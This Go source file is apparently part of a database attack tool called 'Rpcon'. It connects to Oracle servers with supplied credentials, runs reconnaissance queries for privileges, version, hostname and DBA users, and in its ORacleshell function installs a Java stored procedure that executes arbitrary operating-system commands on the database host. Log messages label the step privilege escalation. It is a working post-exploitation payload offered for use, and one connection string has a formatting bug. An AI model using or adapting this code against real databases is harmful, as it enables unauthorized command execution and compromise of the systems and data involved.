package cmdpackage

import (
	"Rpcon/common"
	"Rpcon/pkg"
	"database/sql"
	"fmt"
	_ "github.com/sijms/go-ora/v2"
	"log"
)

//https://www.cnblogs.com/jiangyuqin/p/10135963.html
var cfg = []string{
	"SELECT * FROM session_privs;\n",
	"SELECT * FROM session_privs;\n",
	"SELECT banner FROM v$version WHERE banner LIKE 'Oracle%';\n",              //查询数据库版本信息
	"SELECT banner FROM v$version where banner like 'TNS%';\n",                 //查询操作系统版本
	"SELECT UTL_INADDR.get_host_name FROM dual;\n",                             //查询主机名
	"SELECT DISTINCT grantee FROM dba_sys_privs WHERE ADMIN_OPTION = 'YES';\n", //查询所有dba用户
}

var exp = []string{`create or replace and resolve java source named "JavaUtil" as
import java.io.*;
public class JavaUtil extends Object
{
    public static String ExecCommand(String cmd)
    {
        try {
            BufferedReader myReader= new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(cmd).getInputStream()));
            String stemp,str = "";
            while ((stemp = myReader.readLine()) != null) str += stemp + "\n";
            myReader.close();
            return str;
        } catch (Exception e){
            return e.toString();
        }
    }
}
`,
	`create or replace function ExecCommand(cmd in varchar2) return varchar2
as
language java
name 'JavaUtil.ExecCommand(java.lang.String) return String';
`,
}

func Orconn() (*sql.DB, error) {
	if common.DBname == "" {
		common.DBname = "orcl"
		dns := fmt.Sprintf("oracle://%s:%s@%s:%v/%s", common.User, common.Password, common.Host, common.Port)
		fmt.Println(dns)
		conn, err := sql.Open("oracle", dns)
		if err != nil {
			log.Fatal("Open Connection failed:", err.Error())
		}
		return conn, err
	} else {
		dns := fmt.Sprintf("oracle://%s:%s@%s:%v/%s", common.User, common.Password, common.Host, common.Port, common.DBname)
		fmt.Println(dns)
		conn, err := sql.Open("oracle", dns)
		if err != nil {
			log.Fatal("Open Connection failed:", err.Error())
		}
		return conn, err
	}
}

func ORquery() {
	conn, _ := Orconn()
	stmt, err := conn.Prepare(common.Code)
	rows, err := stmt.Query()
	if err != nil {
		log.Fatal("Query failed:", err.Error())
	}

	//建立一个列数组
	cols, err := rows.Columns()
	var colsdata = make([]interface{}, len(cols))
	for i := 0; i < len(cols); i++ {
		colsdata[i] = new(interface{})
		fmt.Print(cols[i])
		fmt.Print("\t")
	}
	fmt.Println()

	//遍历每一行
	for rows.Next() {
		rows.Scan(colsdata...) //将查到的数据写入到这行中
		pkg.PrintRow(colsdata) //打印此行
	}
	defer rows.Close()
	defer func() { conn.Close() }()
}

func ORcfg() {
	conn, _ := Orconn()
	for i := range cfg {
		stmt, err := conn.Prepare(cfg[i])
		if err != nil {
			log.Fatal("Prepare failed:", err.Error())
		}
		//通过Statement执行查询
		rows, err := stmt.Query()
		if err != nil {
			log.Fatal("Query failed:", err.Error())
		}

		//建立一个列数组
		cols, err := rows.Columns()
		var colsdata = make([]interface{}, len(cols))
		for i := 0; i < len(cols); i++ {
			colsdata[i] = new(interface{})
			fmt.Print(cols[i])
			fmt.Print("\t")
		}
		fmt.Println()

		//遍历每一行
		for rows.Next() {
			rows.Scan(colsdata...) //将查到的数据写入到这行中
			pkg.PrintRow(colsdata) //打印此行
		}
	}
	defer func() { conn.Close() }()
}

func ORacleshell() {
	conn, err := Orconn()
	if err != nil {
		log.Println(err)
	}
	for i := range exp {
		a, err := conn.Prepare(exp[i])
		if err != nil {
			log.Print("提权失败")
			log.Print("1")
			log.Print(err)
		}
		_, err = a.Query()
		if err != nil {
			log.Print("提权失败")
			log.Print(err)
		}
	}
	ORcleCode := fmt.Sprintf(`select ExecCommand('%s') from dual`, common.Code)
	stmt, err := conn.Prepare(ORcleCode)
	if err != nil {
		log.Fatal("Prepare failed:", err.Error())
	}
	defer stmt.Close()
	//通过Statement执行查询
	rows, err := stmt.Query()
	if err != nil {
		log.Fatal("Query failed:", err.Error())
	}

	//建立一个列数组
	cols, err := rows.Columns()
	var colsdata = make([]interface{}, len(cols))
	for i := 0; i < len(cols); i++ {
		colsdata[i] = new(interface{})
		fmt.Print(cols[i])
		fmt.Print("\t")
	}
	fmt.Println()

	//遍历每一行
	for rows.Next() {
		rows.Scan(colsdata...) //将查到的数据写入到这行中
		pkg.PrintRow(colsdata) //打印此行
	}
	defer rows.Close()
	defer func() { conn.Close() }()
}
